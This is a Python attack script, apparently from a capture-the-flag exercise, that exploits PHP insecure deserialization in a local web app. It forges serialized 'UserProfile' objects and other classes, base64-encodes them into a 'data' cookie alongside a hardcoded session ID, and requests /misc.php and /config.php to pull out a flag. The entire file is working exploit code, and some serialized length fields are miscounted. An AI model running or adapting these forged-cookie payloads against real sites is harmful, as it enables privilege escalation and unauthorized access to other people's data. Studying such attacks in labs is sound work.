import base64
import urllib.parse
import requests
import re

# Target URL
base_url = "http://127.0.0.1:33127"

# Test different PHP serialized payloads to exploit insecure deserialization
# The goal is to access /misc.php and retrieve the secret note with FLAG{}

test_payloads = []

# Current cookie: O:11:"UserProfile":2:{s:6:"userid";i:9;s:8:"username";s:8:"testuser";}
# Let's try various modifications

# Payload 1: Change userid to 1 (potentially admin)
payload1 = 'O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:8:"testuser";}'
test_payloads.append(("userid_1", payload1))

# Payload 2: Change username to "admin"
payload2 = 'O:11:"UserProfile":2:{s:6:"userid";i:9;s:8:"username";s:5:"admin";}'
test_payloads.append(("username_admin", payload2))

# Payload 3: Change both to admin
payload3 = 'O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:5:"admin";}'
test_payloads.append(("full_admin", payload3))

# Payload 4: Try with different user IDs that might have access
for user_id in [0, 1, 2, 5, 10, 100]:
    payload = f'O:11:"UserProfile":2:{{s:6:"userid";i:{user_id};s:8:"username";s:8:"testuser";}}'
    test_payloads.append((f"userid_{user_id}", payload))

# Payload 5: Different object type - maybe the app uses a different class
# Try SecretNote or similar class that might give us direct access
payload5 = 'O:9:"SecretNote":1:{s:4:"note";s:17:"FLAG{test_flag}";}'
test_payloads.append(("secretnote_direct", payload5))

# Payload 6: Empty or minimal object
payload6 = 'O:11:"UserProfile":0:{}'
test_payloads.append(("empty_profile", payload6))

# Payload 7: Try to trigger different magic methods
# __toString might be triggered when object is used in string context
payload7 = 'O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:6:"System";}'
test_payloads.append(("system_user", payload7))

print("Testing PHP insecure deserialization payloads against /misc.php")
print("=" * 60)

results = []

for payload_name, payload in test_payloads:
    # Encode the payload
    b64_encoded = base64.b64encode(payload.encode()).decode()
    url_encoded = urllib.parse.quote(b64_encoded)
    
    # Create cookies
    cookies = {
        'data': url_encoded,
        'PHPSESSID': 'ca3885931b3dde5fc7c90d5b9f0754d6'
    }
    
    try:
        # Try to access /misc.php with modified cookie
        response = requests.get(f"{base_url}/misc.php", cookies=cookies, timeout=10)
        
        print(f"\n[>] Testing payload: {payload_name}")
        print(f"[>] Payload: {payload}")
        print(f"[>] Status: {response.status_code}")
        print(f"[>] Content Length: {len(response.content)} bytes")
        
        if response.text.strip():
            print(f"[>] Response:\n{response.text}")
            
            # Check for FLAG pattern
            flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
            if flag_match:
                print(f"[!] FLAG FOUND: {flag_match.group(0)}")
                results.append({
                    'payload_name': payload_name,
                    'status': response.status_code,
                    'flag': flag_match.group(0),
                    'response': response.text
                })
        else:
            print("[>] Response: Empty")
            
        # Also try config.php to see if we get anything there
        response2 = requests.get(f"{base_url}/config.php", cookies=cookies, timeout=10)
        if response2.text.strip() and len(response2.text) > 0:
            print(f"[>] Config.php Response:\n{response2.text}")
            
            # Check for FLAG pattern in config
            flag_match2 = re.search(r'FLAG\{[^}]+\}', response2.text)
            if flag_match2:
                print(f"[!] FLAG FOUND in config.php: {flag_match2.group(0)}")
                results.append({
                    'payload_name': f"{payload_name}_config",
                    'status': response2.status_code,
                    'flag': flag_match2.group(0),
                    'response': response2.text
                })
                
    except Exception as e:
        print(f"[!] Error with payload {payload_name}: {e}")

print("\n" + "=" * 60)
print("SUMMARY:")
if results:
    print(f"[✓] Found {len(results)} successful payload(s)")
    for result in results:
        print(f"  - Payload '{result['payload_name']}' returned flag: {result['flag']}")
else:
    print("[✗] No successful payloads found yet")
    print("[i] Trying additional attack vectors...")
    
    # Let's also test some other PHP serialization tricks
    print("\n" + "-" * 60)
    print("Testing additional attack vectors:")
    
    # Try different object structures that might trigger RCE or file access
    additional_payloads = [
        ("exception", 'O:9:"Exception":2:{s:7:"message";s:4:"test";s:6:"string";s:4:"test";}'),
        ("array_wrap", 'a:1:{i:0;O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:5:"admin";}}'),
        ("serialized_in_serialized", 's:67:"O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:5:"admin";}";'),
    ]
    
    for payload_name, payload in additional_payloads:
        b64_encoded = base64.b64encode(payload.encode()).decode()
        url_encoded = urllib.parse.quote(b64_encoded)
        
        cookies = {
            'data': url_encoded,
            'PHPSESSID': 'ca3885931b3dde5fc7c90d5b9f0754d6'
        }
        
        try:
            response = requests.get(f"{base_url}/misc.php", cookies=cookies, timeout=10)
            print(f"\n[>] Additional test: {payload_name}")
            print(f"[>] Status: {response.status_code}")
            if response.text.strip():
                print(f"[>] Response: {response.text[:200]}")
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"[!] FLAG FOUND: {flag_match.group(0)}")
        except Exception as e:
            print(f"[!] Error: {e}")
